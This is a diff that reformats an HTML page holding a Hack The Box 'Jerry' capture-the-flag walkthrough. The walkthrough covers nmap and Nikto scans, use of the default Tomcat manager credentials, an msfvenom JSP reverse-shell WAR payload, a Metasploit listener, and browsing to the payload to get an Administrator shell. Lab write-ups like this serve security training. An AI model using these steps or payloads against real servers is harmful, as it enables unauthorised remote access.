@@ -126,21 +126,21 @@
 								<br />
 								<p>Used command:</p>
 								<code>
-									<p>root@kali:~/Documents/htb/Jerry# nmap -sC -sV -oA jerry 10.10.10.95</p>
+root@kali:~/Documents/htb/Jerry# nmap -sC -sV -oA jerry 10.10.10.95
 								</code>
 								<br />
 								<p>Output:</p>
 								<code>
-									<p>Starting Nmap 7.60 ( https://nmap.org ) at 2018-11-09 21:18 CET</p>
-									<p>Nmap scan report for 10.10.10.95</p>
-									<p>Host is up (0.044s latency).</p>
-									<p>Not shown: 999 filtered ports</p>
-									<p>PORT     STATE SERVICE VERSION</p>
-									<p style="color:yellow;">8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1</p>
-									<p>|_http-favicon: Apache Tomcat</p>
-									<p>|_http-open-proxy: Proxy might be redirecting requests</p>
-									<p>|_http-server-header: Apache-Coyote/1.1</p>
-									<p>|_http-title: Apache Tomcat/7.0.88</p>
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-11-09 21:18 CET
+Nmap scan report for 10.10.10.95
+Host is up (0.044s latency).
+Not shown: 999 filtered ports
+PORT     STATE SERVICE VERSION
+style="color:yellow;">8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+|_http-favicon: Apache Tomcat
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/7.0.88
 								</code>
 								<br />
 								<p>As we can see, port 8080 is open, and is running Apache Tomcat 7.0.88. Surfing to the web page, we are presented with a default Tomcat page. Next, we want to enumerate the website for directories and/or possible vulnerabilities. A nice tool to do this with is <a href="/articles/nikto.html">Nikto</a>.</p>
@@ -148,39 +148,39 @@
 								<li><a href="/articles/nikto.html">Nikto</a></li>
 								<p>Used command:</p>
 								<code>
-									<p>root@kali:~/Documents/htb/Jerry# nikto -h 10.10.10.95 -p 8080</p>
+root@kali:~/Documents/htb/Jerry# nikto -h 10.10.10.95 -p 8080
 								</code>
 								<br />
 								<p>Output:</p>
 								<code>
-									<p>- Nikto v2.1.6</p>
-									<p>---------------------------------------------------------------------------</p>
-									<p>+ Target IP:          10.10.10.95</p>
-									<p>+ Target Hostname:    10.10.10.95</p>
-									<p>+ Target Port:        8080</p>
-									<p>+ Start Time:         2018-11-09 21:31:42 (GMT1)</p>
-									<p>---------------------------------------------------------------------------</p>
-									<p>+ Server: Apache-Coyote/1.1</p>
-									<p>+ The anti-clickjacking X-Frame-Options header is not present.</p>
-									<p>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</p>
-									<p>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</p>
-									<p>+ No CGI Directories found (use '-C all' to force check all possible dirs)</p>
-									<p>+ Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0xW/21630 0x1525691762000</p>
-									<p>+ OSVDB-39272: favicon.ico file identifies this server as: Apache Tomcat</p>
-									<p>+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS</p>
-									<p>+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.</p>
-									<p>+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.</p>
-									<p>+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</p>
-									<p>+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.</p>
-									<p>+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.</p>
-									<p style="color:yellow;">+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat.</p>
-									<p>+ /host-manager/html: Default Tomcat Manager / Host Manager interface found</p>
-									<p>+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)</p>
-									<p>+ /manager/status: Tomcat Server Status interface found (pass protected)</p>
-									<p>+ 7605 requests: 0 error(s) and 14 item(s) reported on remote host</p>
-									<p>+ End Time:           2018-11-09 21:38:46 (GMT1) (424 seconds)</p>
-									<p>---------------------------------------------------------------------------</p>
-									<p>+ 1 host(s) tested</p>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.10.95
++ Target Hostname:    10.10.10.95
++ Target Port:        8080
++ Start Time:         2018-11-09 21:31:42 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache-Coyote/1.1
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0xW/21630 0x1525691762000
++ OSVDB-39272: favicon.ico file identifies this server as: Apache Tomcat
++ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS
++ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
++ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+<span style="color:yellow;">+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat.</span>
++ /host-manager/html: Default Tomcat Manager / Host Manager interface found
++ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
++ /manager/status: Tomcat Server Status interface found (pass protected)
++ 7605 requests: 0 error(s) and 14 item(s) reported on remote host
++ End Time:           2018-11-09 21:38:46 (GMT1) (424 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
 								</code>
 								<br />
 								<p><a href="/articles/nikto.html">Nikto</a> found some default login credentials on 10.10.10.95:8080/manager/html</p>
@@ -197,20 +197,20 @@
 									<br />
 									<p>Command used:</p>
 									<code>
-										<p>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;your ip&gt; LPORT=&lt;port&gt; -f war &gt; reverseshell.war</p>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;your ip&gt; LPORT=&lt;port&gt; -f war &gt; reverseshell.war
 									</code>
 									<br />
 									<p>The payload from the .war file will create a backdoor file inside it with a randomly generated string as a name. This is the file we're gonna browse to after the .war file is uploaded. After browsing to this file, the reverse connection will be established to our Kali machine. We can not browse to this file, if we do not know its name. We can run the following command to get the filename:</p>
 									<p>Command used:</p>
 									<code>
-										<p>root@kali:~/Documents/htb/Jerry# jar -xvf reverseshell.war</p>
+root@kali:~/Documents/htb/Jerry# jar -xvf reverseshell.war
 									</code>
 									<br />
 									<p>Output:</p>
 									<code>
-										<p>created: WEB-INF/</p>
-										<p>inflated: WEB-INF/web.xml</p>
-										<p>inflated: djkwbjspxeqxnor.jsp</p>
+created: WEB-INF/
+inflated: WEB-INF/web.xml
+inflated: djkwbjspxeqxnor.jsp
 									</code>
 									<br />
 									<p>According to the given output, the filename is <b>djkwbjspxeqxnor.jsp</b></p>
@@ -220,13 +220,13 @@
 									<br />
 									<p>Commands used:</p>
 									<code>
-										<p>root@kali: msfconsole</p>
-										<p>msf>use exploit multi/handler</p>
-										<p>msf>set payload java/jsp_shell_reverse_tcp</p>
-										<p>msf>set LHOST &lt;local IP&gt;</p>
-										<p>msf>set LPORT &lt;local port&gt;</p>
-										<p>msf> set ExitOnSession false</p>
-										<p>msf>exploit -j</p>
+root@kali: msfconsole
+msf>use exploit multi/handler
+msf>set payload java/jsp_shell_reverse_tcp
+msf>set LHOST &lt;local IP&gt;
+msf>set LPORT &lt;local port&gt;
+msf> set ExitOnSession false
+msf>exploit -j
 									</code>
 									<br />
 									<p>The -j parameter will keep the connected session in the background.</p>
@@ -237,14 +237,14 @@
 									<li>Execute the payload</li>
 									<p>To execute the payload to connect back to our listener, we must browse to the .jsp file we generated in step 1. The URL to browse to will be:</p>
 									<code>
-										<p>http://10.10.10.95:8080/&lt;Name of .war file&gt;/&lt;Name of .jsp file&gt;</p>
-										<br />
-										<p>http://10.10.10.95:8080/reverseshell/djkwbjspxeqxnor.jsp</p>
+http://10.10.10.95:8080/&lt;Name of .war file&gt;/&lt;Name of .jsp file&gt;
+
+http://10.10.10.95:8080/reverseshell/djkwbjspxeqxnor.jsp
 									</code>
 									<br />
 									<p>Back on Kali, we will be presented with an Administrator shell. We can now read the file that will contain both user.txt and root.txt.</p>
 									<code>
-										<p>C:\Users\Administrator\Desktop\flags>more &quot;2 for the price of 1.txt&quot;</p>
+C:\Users\Administrator\Desktop\flags>more &quot;2 for the price of 1.txt&quot;
 									</code>
 									<br />
 								</ol>
